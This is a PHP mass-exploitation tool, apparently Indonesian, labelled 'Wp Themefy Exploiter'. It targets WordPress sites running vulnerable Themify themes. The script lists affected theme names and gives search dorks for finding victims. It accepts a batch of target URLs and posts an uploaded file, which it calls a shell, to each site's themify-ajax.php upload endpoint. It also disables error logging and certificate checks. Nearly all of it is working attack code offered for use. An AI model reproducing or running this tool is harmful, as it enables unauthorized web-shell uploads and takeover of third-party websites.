<title>Wp Themefy Exploiter</title></head>
<?php
include("../head.php");
?>
<center>
NamaThemesnya : PhotoBox, Elemin, Bloggie, Tisa, Funki, Pinboard, Folo, grido, Suco, iThemes2, fullpane, simfo, rezo, bizco, minshop <br> themify-landing, themify-elegant, themify-base, themify-corporate, themify-music, postline, newbasic , Dan Lain-Lain<br>
Dork: inurl:/wp-content/themes/namathemes/ atau index of /wp-content/themes/namathemes/
<form enctype="multipart/form-data" method="POST">
<font color=red>TARGET : </font><br><textarea name="attack" class="form-control con7" placeholder="http://site.com/" style="width: 600px; height: 250px; margin: 5px auto; resize: none;"></textarea><br>
<br>
<font color=red>Nama Themes : <input type="text" class="con7" name="inithemes" placeholder="Namathemes"><br>
<font color=red>Upload File : </font><input name="file" class="kntd" type="file">
<br>
<input name="Fuck" type="submit" class="kntd" value="Exploit"></nobr>
<br>
</form>
<br>

<?php
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

$themes = $_POST['inithemes'];
$file = $_POST['file'];
$target = explode("\r\n", $_POST['attack']);
if($_POST['Fuck']) {
foreach($target as $url) {
$path = "/wp-content/themes/".$themes."/themify/themify-ajax.php?upload=1";
$shell = "/wp-content/themes/".$themes."/uploads/".$file;
echo '<br>Trying to exploit '.$url.'<br>';
$urlexploit = $url.$path;
$post = array('Filedata'=>"@$file");
$ch = curl_init($urlexploit);
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0
(Windows NT 6.1; rv:32.0) Gecko/20100101
Firefox/32.0");
curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt ($ch, CURLOPT_POST, 1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);
$hasil= curl_exec ($ch);
curl_close ($ch);
$jembod = $url.$shell;
if (preg_match("/200 OK/", $jembod)){
echo "<a href='".$jembod."'>Click Here</a>";
} else { echo "Failed";}
}
}
?>